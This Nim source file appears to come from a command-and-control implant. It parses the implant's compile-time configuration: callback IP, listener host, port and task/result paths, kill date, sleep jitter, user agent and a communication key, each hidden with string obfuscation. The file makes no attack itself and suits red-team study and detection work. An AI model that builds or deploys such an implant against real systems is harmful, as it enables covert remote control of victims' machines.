import parsetoml, strutils, tables
import macros
from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
import ../util/strenc

# Parse the configuration file
# This constant will be stored in the binary itself (hence the XOR)
proc parseConfig*() : Table[string, string] =
    var config = initTable[string, string]()

    # Allow us to re-write the static XOR key used for pre-crypto operations
    # This is handled by the Python wrapper at compile time, the default value shouldn't be used
    const IMPLANT_CALLBACK_IP {.strdefine.}: string = obf("127.0.0.1")
    const HOSTNAME {.strdefine.}: string = obf("")
    const TYPE {.strdefine.}: string = obf("")
    const PORT {.intdefine.}: int = 0
    const REGISTER_PATH {.strdefine.}: string = obf("")
    const TASK_PATH {.strdefine.}: string = ""
    const RESULT_PATH {.strdefine.}: string = ""
    const RECONNECT_PATH {.strdefine.}: string = ""
    const KILL_DATE {.strdefine.}: string = ""
    const SLEEP_TIME {.intdefine.}: int = 0
    const SLEEP_JITTER {.intdefine.}: int = 0
    const USER_AGENT {.strdefine.}: string = ""
    const HTTP_ALLOW_COMMUNICATION_KEY {.strdefine.}: string = ""

    # Workspace identifier for this implant
    const workspace_uuid {.strdefine.}: string = ""

    config[obf("hostname")]         = $HOSTNAME
    config[obf("listenerType")]     = $TYPE
    config[obf("listenerPort")]     = $PORT
    config[obf("listenerRegPath")]  = $REGISTER_PATH
    config[obf("listenerTaskPath")] = $TASK_PATH
    config[obf("listenerResPath")]  = $RESULT_PATH
    config[obf("reconnectPath")]    = $RECONNECT_PATH
    config[obf("implantCallbackIp")]       = IMPLANT_CALLBACK_IP
    config[obf("killDate")]         = KILL_DATE
    config[obf("sleepTime")]        = $SLEEP_TIME
    config[obf("sleepJitter")]      = $SLEEP_JITTER
    config[obf("userAgent")]        = USER_AGENT
    config[obf("httpAllowCommunicationKey")] = HTTP_ALLOW_COMMUNICATION_KEY
    
    # Add workspace information if defined
    if workspace_uuid != "":
        config[obf("workspace_uuid")] = workspace_uuid
    
    return config     